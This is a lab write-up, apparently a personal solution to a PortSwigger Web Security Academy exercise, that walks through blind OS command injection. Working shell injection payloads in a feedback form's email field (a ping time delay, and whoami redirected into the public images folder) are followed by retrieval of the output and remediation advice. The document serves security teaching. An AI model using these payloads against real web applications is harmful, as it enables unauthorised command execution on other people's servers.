```markdown
# Lab: Blind OS Command Injection with Output Redirection

**Platform:** PortSwigger Web Security Academy  
**Category:** OS Command Injection  
**Difficulty:** Practitioner  
**Author:** Mostafa Abdelmonem  

---

## Environment & Tools Used
* **Browser:** Google Chrome (with FoxyProxy extension)
* **Tools:** Burp Suite (Proxy, Repeater)
* **Target Application:** E-Commerce Web Application (Feedback Form & Image Retrieval Endpoints)

---

## Vulnerability Overview & Technical Concept

**Blind OS Command Injection with Output Redirection** occurs when an application executes user-controlled shell commands without rendering stdout/stderr back into the HTTP response, while simultaneously permitting access to a writable file system directory served by the web server.

In Linux shell environments, the output redirection operator (`>`) can be used to capture the standard output of an injected system command and write it directly to a file within a web-accessible folder (such as an images upload directory). An attacker can subsequently retrieve the command output by fetching the newly created file via standard HTTP requests.

---

## Step-by-Step Exploitation Walkthrough

### Step 1: Endpoint & Injection Point Verification
1. Intercepted the feedback submission request via **Burp Suite Proxy** and forwarded it to **Burp Repeater**:

```http
POST /feedback/submit HTTP/1.1
Host: target-app.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=Krmsdfasdfhasjdfsdf&name=Mostafa&email=x&subject=cookie&message=Hello

```

2. Verified the time-delay vulnerability on the `email` parameter using `ping` to confirm shell execution context:
* **Payload:** `email=x||ping+-c+10+127.0.0.1||`
* **Result:** Confirmed backend shell evaluation via a 10-second processing delay.



---

### Step 2: Redirecting Command Output to a Web-Writable Directory

Leveraged the known writable path `/var/www/images/` to capture the output of the target `whoami` command.

1. Modified the `email` parameter payload to execute `whoami` and redirect its output to a text file inside `/var/www/images/`:

```http
POST /feedback/submit HTTP/1.1
Host: target-app.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=Krmsdfasdfhasjdfsdf&name=Mostafa&email=x||whoami>/var/www/images/output.txt||&subject=cookie&message=Hello

```

#### Detailed Payload Mechanics:

* `x`: Triggers an invalid email evaluation, causing the initial process to fail.
* `||`: The logical OR operator in shell scripting, forcing execution of the secondary command upon failure of the first.
* `whoami`: The OS command that prints the current effective user ID running the web application worker.
* `>`: Shell output redirection operator that overwrites/creates the target file with the command output.
* `/var/www/images/output.txt`: Target absolute file system path located inside the public image serving directory.

---

### Step 3: Fetching the Redirection File via Application Endpoints

1. Located a standard product image on the storefront web application.
2. Opened the image URL in a new tab (or inspected the GET request in Burp Suite):

```http
GET /image?filename=76.jpg HTTP/1.1
Host: target-app.web-security-academy.net

```

3. Substituted the `filename` parameter value with the newly created file name:

```http
GET /image?filename=output.txt HTTP/1.1
Host: target-app.web-security-academy.net

```

---

## Proof of Concept (PoC) & Exploitation Result

* **Extracted Content:** The HTTP response returned the contents of `output.txt` containing the system username: `peter-Vepx3W`.
* **Impact:** Arbitrary command execution and persistent writing to web-accessible directories, allowing full out-of-band data exfiltration.
* **Lab Resolution:** The lab completed successfully upon retrieving the `whoami` execution output.

---

## Remediation & Mitigation

1. **Avoid System Shell Execution:**
Refactor features (such as feedback routing or email dispatching) to use native language APIs and libraries rather than passing arguments to OS shell binaries.
2. **Restrict Directory Permissions & Execution Controls:**
Ensure web-writable directories (e.g., upload folders) do not execute scripts and restrict system user file creation permissions where applicable.
3. **Strict Input Sanitization:**
Filter out shell metacharacters (`>`, `|`, `;`, `&`, `$`, ```) using strict server-side parameter validation regex patterns.

```

```
